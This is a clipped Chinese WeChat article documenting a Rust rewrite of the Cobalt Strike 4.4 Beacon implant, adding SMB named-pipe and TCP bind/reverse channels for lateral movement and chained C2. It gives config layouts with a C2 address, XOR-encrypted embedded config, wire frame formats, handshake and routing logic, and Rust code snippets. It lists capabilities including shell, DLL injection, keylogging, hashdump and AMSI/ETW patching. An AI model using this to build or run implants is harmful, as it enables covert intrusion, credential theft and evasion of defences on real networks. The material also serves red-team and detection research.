---
title: 【微信】Rust Cobalt Strike 4.4 Beacon：SMB,TCP Beacon重写记录
source: https://mp.weixin.qq.com/s/qTA9_bcjDC6I2pSLgBYYVA
source_host: mp.weixin.qq.com
clip_date: 2026-09-22T15:22:05+08:00
trace_id: b9f2334a-5fe4-4f46-b470-03c98641fece
content_hash: 54b77408fabc2a3bf744627306f7d671cc75d13be5a680795b964e65fc7df2d9
status: synced
tags:
  - 微信
  - 恶意样本
  - 协议分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Rust 版 Cobalt Strike Beacon 新增 SMB 与 TCP 两条传输通道，三个入口共用同一套 `command::handle_command()` 命令分发，只替换传输层。
ai_summary_style: key-points
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 3e375244-d011-81ca-b38d-d4e53d37c3bf
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Rust 版 Cobalt Strike Beacon 新增 SMB 与 TCP 两条传输通道，三个入口共用同一套 `command::handle_command()` 命令分发，只替换传输层。
> 
> - **架构：** `beacon-rs.exe`(HTTP)、`tcp_beacon.exe`、`smb_beacon.exe` 共享命令表；SMB/TCP 子 Beacon 通过父 Beacon 链式转发，最终由父 Beacon 以 HTTP POST 回传 CS。
> - **配置加密：** `config.smb.json` / `config.tcp.json` 定义 `pipe_name`、`mode`(bind/reverse)、`server/port`、`bind_host/bind_port`、可选帧魔数 `frame_header` 与 CS RSA 公钥，经 `build.rs` 加密为 `generated_config.rs`，运行时 XOR 解密。
> - **链路帧格式：** 统一为 2 字节大端 header 长度 + 可选 magic + 4 字节小端 payload 长度 + payload；空 magic 时 header 长度固定为 4。
> - **握手与路由：** 子 Beacon 发 4 字节小端 client_id + RSA 加密 metadata；父 Beacon 解析 agent_id 后回传 `CALLBACK_PIPE_OPEN`（SMB hint 固定 445，TCP hint 为 `0x00100000 | port`），命令经 `CMD_TYPE_PIPE_ROUTE` 下发，回调用 `CALLBACK_PIPE_READ` 上报。
> - **实现细节：** SMB 用 `CreateNamedPipeW`/`CreateFileA` 封装命名管道（MESSAGE 模式）；TCP 放弃标准库、在 `wsock.rs` 封装 Winsock，并用 `select` 1ms 超时做非阻塞轮询，避免阻塞父 Beacon 主循环；下行包为 AES-CBC 密文 + HMAC-SHA256 前 16 字节。

**freedom安全** *2026年9月22日 14:56*

## 1\. SMB Beacon 定位

SMB Beacon 不是一套独立的命令实现，而是给同一个 Rust Beacon 增加了一条 SMB 传输通道。

项目里的三个入口共用同一套 `command::handle_command()` ：

```
beacon-rs.exe    HTTP Beacon
tcp_beacon.exe   TCP Beacon
smb_beacon.exe   SMB Beacon
```

SMB 的典型使用场景是内网横向和链式转发：

```
CS teamserver
   |
   | HTTP
   v
HTTP Beacon（父）
   |
   | 命名管道
   v
SMB Beacon（子）
   |
   | 命名管道
   v
更下一层 SMB Beacon
```

## 2\. 配置文件

`config.smb.json` ：

```json
{
  "pipe_name": "\\\\.\\pipe\\beacon_rs_smb",
  "smb_frame_header": "",
  "pub_key_pem": "-----BEGIN PUBLIC KEY-----..."
}
```

字段说明：

| 字段  | 作用  |
| --- | --- |
| `pipe_name` | SMB Beacon 监听的命名管道 |
| `smb_frame_header` | 可选帧魔数，可用来做流量伪装 |
| `pub_key_pem` | CS 的 RSA 公钥，用于构造 metadata |

配置在 `build.rs` 里加密成 `generated_config.rs` ，运行时再 XOR 解密。

## 3\. 链路结构

SMB 子 Beacon 的完整链路：

```rust
父 Beacon connect SMB
   -> CreateFileA 连接命名管道
   -> 子 Beacon 发送 metadata 握手帧
   -> 父 Beacon 解析 agent_id + RSA metadata
   -> 父 Beacon 回传 CALLBACK_PIPE_OPEN 给 CS
   -> CS 下发 CMD_TYPE_PIPE_ROUTE
   -> 父 Beacon 写链路帧给子 Beacon
   -> 子 Beacon 解密、执行命令
   -> 子 Beacon 回传加密回调包
   -> 父 Beacon 读取并 POST CALLBACK_PIPE_READ
```

## 4\. 命名管道实现

管道封装在 `src/npipe.rs` ：

```
PipeServer
  CreateNamedPipeW
  ConnectNamedPipe

Pipe
  CreateFileA
  SetNamedPipeHandleState
  ReadFile
  WriteFile
  PeekNamedPipe
```

服务端使用：

```
PIPE_ACCESS_DUPLEX
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE
PIPE_UNLIMITED_INSTANCES
```

客户端使用 `CreateFileA` 连接，并设置 `PIPE_READMODE_MESSAGE` 。

## 5\. 链路帧格式

HTTP、TCP、SMB 的 link 帧使用同一套自定义格式：

```
2 字节 header length（大端）
可选 frame_header / magic
4 字节 payload length（小端）
payload
```

示例，空 magic：

```
00 04
00 00 00 0C
<12 字节 payload>
```

这里 `00 04` 表示 header 长度为 4。

对应代码：

```rust
fn build_link_frame(payload: &[u8], magic: &[u8]) -> Vec<u8> {
    let header_len = magic.len() + 4;
    let mut frame = Vec::with_capacity(2 + header_len + payload.len());
    frame.extend_from_slice(&(header_len as u16).to_be_bytes());
    frame.extend_from_slice(magic);
    frame.extend_from_slice(&[0u8; 4]);
    let offset = frame.len() - 4;
    frame[offset..offset + 4].copy_from_slice(&(payload.len() as u32).to_le_bytes());
    frame.extend_from_slice(payload);
    frame
}
```

## 6\. 上线握手

`smb_beacon.exe` 启动后：

```
创建命名管道
等待客户端连接
发送握手帧
进入命令处理循环
```

握手帧 payload：

```
4 字节 client_id（小端）
RSA 加密后的 metadata
```

父 Beacon 读取握手后构造 `CALLBACK_PIPE_OPEN` ：

```
4 字节 agent_id（大端）
4 字节 hint（大端）
子 Beacon metadata
```

SMB hint 固定为 `445` 。

## 7\. 命令转发

父 Beacon 收到 CS 的 link 命令后，对应命令：

```
CMD_TYPE_PIPE_OPEN_EXPLICIT
CMD_TYPE_PIPE_ROUTE
CMD_TYPE_PIPE_CLOSE
CMD_TYPE_PIPE_REOPEN
```

下行数据流：

```rust
CS
  -> CMD_TYPE_PIPE_ROUTE
  -> 父 Beacon handle_route()
  -> write_link_frame()
  -> SMB 子 Beacon read_frame()
  -> decrypt_packet()
  -> command::handle_command()
```

下行链路帧 payload 是加密命令包：

```
AES-CBC 密文 + HMAC-SHA256 前 16 字节
```

## 8\. 回调回传

子 Beacon 执行命令后调用 `post_packet()` ：

```
生成加密 callback packet
前面加 4 字节大端长度
再包一层 link frame
写回父 Beacon
```

父 Beacon 的 `link::poll()` 读取完整帧后，构造：

```
CALLBACK_PIPE_READ
agent_id（4 字节大端）
子 Beacon 的 4 字节长度 + 加密回调包
```

然后通过 HTTP POST 回传 CS。

## 9\. 已实现命令

SMB Beacon 与 HTTP/TCP 共用命令表，因此支持：

```bash
sleep
pwd
getuid
shell
cd
setenv
getprivs
ps
filebrowse
drives
mkdir
rm
cp
mv
upload
download
inject
spawn
dllinject
jobs
jobkill
execute-assembly
inline-execute
screenshot
keylogger
hashdump
AMSI / ETW patch
```

## 11\. 代码模块

| 文件  | 作用  |
| --- | --- |
| `src/smb/beacon.rs` | SMB Beacon 主循环、握手、命令处理 |
| `src/npipe.rs` | 命名管道封装 |
| `src/link.rs` | 父 Beacon 的 SMB/TCP link 管理 |
| `src/command.rs` | 统一命令分发 |
| `src/packet.rs` | 命令 ID、回调类型、报文封装 |
| `src/crypto.rs` | AES、HMAC、RSA |

## 12\. 验证

当前测试覆盖：

```
smb_frame_roundtrip
link_frame_parser_handles_partial_frames
link_frame_parser_skips_empty_frames
smb_link_large_frame_roundtrip
```

验证流程：

```
启动 smb_beacon.exe
HTTP Beacon 执行 link 127.0.0.1 beacon_rs_smb
子 beacon 执行 shell whoami
父 beacon 回传 PIPE_READ
```

## 13\. 效果

成功上线smb beacon

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9f2b00c88dce4eca.png)

## 1\. TCP Beacon 定位

TCP Beacon 是项目里的另一条持久连接通道，适合内网不稳定 HTTP 环境、跳板场景和链式转发。

```
CS teamserver
   |
   | HTTP
   v
HTTP Beacon（父）
   |
   | TCP
   v
TCP Beacon（子）
```

TCP 和 HTTP、SMB 共用同一套命令表，只更换传输层。

## 2\. 配置文件

`config.tcp.json` ：

```json
{
  "mode": "bind",
  "server": "172.20.10.3",
  "port": 4444,
  "bind_host": "0.0.0.0",
  "bind_port": 4444,
  "tcp_frame_header": "",
  "pub_key_pem": "-----BEGIN PUBLIC KEY-----..."
}
```

字段说明：

| 字段  | 作用  |
| --- | --- |
| `mode` | `bind` 或 `reverse` |
| `server` | reverse 模式连接地址 |
| `port` | reverse 模式连接端口 |
| `bind_host` | bind 模式监听地址 |
| `bind_port` | bind 模式监听端口 |
| `tcp_frame_header` | 可选链路魔数 |
| `pub_key_pem` | CS RSA 公钥 |

## 3\. Socket 实现

项目没有直接依赖 Rust 标准库 TCP，而是在 `src/wsock.rs` 里封装 Winsock：

```
WSASocketW
connect
bind
listen
accept
send
recv
select
setsockopt
```

## 4\. bind / reverse

### 4.1 bind

```
RawListener::bind(bind_host, bind_port)
listener.accept()
```

适合目标能出网但不能主动连接外部的场景。

### 4.2 reverse

```
RawSocket::connect(server, port)
```

适合目标可主动连接 C2/中继端口的场景。

## 5\. 链路帧格式

TCP 使用与 SMB 相同的 link 帧：

```
2 字节 header length（大端）
可选 frame_header / magic
4 字节 payload length（小端）
payload
```

示例：

```
00 04
00 00 00 0C
<12 字节 payload>
```

## 6\. 上线握手

`tcp_beacon.exe` 收到连接后：

```
发送握手帧
进入命令处理循环
```

握手帧 payload：

```
4 字节 client_id（小端）
RSA 加密后的 metadata
```

父 Beacon `connect` 后：

```
读取握手帧
解析 agent_id
hint = 0x00100000 | port
回传 CALLBACK_PIPE_OPEN
```

## 7\. 命令转发

父 Beacon 收到 CS 的 `CMD_TYPE_TCP_CONNECT` 后建立 TCP 链路。

后续命令通过 `CMD_TYPE_PIPE_ROUTE` 转发：

```rust
CS
  -> CMD_TYPE_PIPE_ROUTE
  -> handle_route()
  -> write_link_frame()
  -> TCP 子 Beacon read_frame()
  -> decrypt_tcp_packet()
  -> command::handle_command()
```

## 8\. 回调回传

TCP 子 Beacon 的回调流程：

```
生成加密 callback packet
前面加 4 字节大端长度
再包一层 link frame
写回父 Beacon
```

父 Beacon：

```
link::poll()
  -> 非阻塞读取 socket
  -> read_buf 缓冲
  -> 解析完整链路帧
  -> POST CALLBACK_PIPE_READ
```

## 9\. 非阻塞轮询

TCP 没有数据时必须快速返回，不能阻塞 HTTP 父 Beacon 主循环。

实现方式：

```
select(read_fd, 1ms)
  -> 不可读：返回超时
  -> 可读：recv() 读入 read_buf
  -> 解析完整帧
```

对应代码：

```rust
pub fn wait_readable(&mut self, timeout: Duration) -> Result<bool, String> {
    let select: SelectFn = dyn_fn("select")?;
    let mut readfds = FdSet::new();
    readfds.insert(self.socket);
    let timeval = Timeval { ... };
    let status = unsafe { select(0, &mut readfds, null_mut(), null_mut(), &timeval) };
    Ok(status > 0)
}
```

## 10\. 已实现命令

TCP Beacon 同样支持：

```bash
sleep
pwd
getuid
shell
cd
setenv
getprivs
ps
filebrowse
drives
mkdir
rm
cp
mv
upload
download
inject
spawn
dllinject
jobs
jobkill
execute-assembly
inline-execute
screenshot
keylogger
hashdump
AMSI / ETW patch
```

## 11\. 代码模块

| 文件  | 作用  |
| --- | --- |
| `src/tcp/beacon.rs` | TCP Beacon 主循环、握手、命令处理 |
| `src/wsock.rs` | Winsock 封装、select 等待 |
| `src/link.rs` | 父 Beacon 的 TCP/SMB link 管理 |
| `src/command.rs` | 统一命令分发 |
| `src/packet.rs` | 命令 ID、回调类型、报文封装 |
| `src/crypto.rs` | AES、HMAC、RSA |

## 12\. 验证

测试覆盖：

```
tcp_link_read_timeout_returns
tcp_link_wait_readable_false_after_frame_read
link_frame_parser_handles_partial_frames
link_frame_parser_skips_empty_frames
```

验证流程：

```
启动 tcp_beacon.exe
HTTP Beacon 执行 connect 127.0.0.1 4444
子 beacon 执行 shell whoami
父 beacon 回传 PIPE_READ
```

## 14\. 效果

成功实现tcp beacon

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/43a2cb196f9429b8.png)

恶意开发规避 · 目录
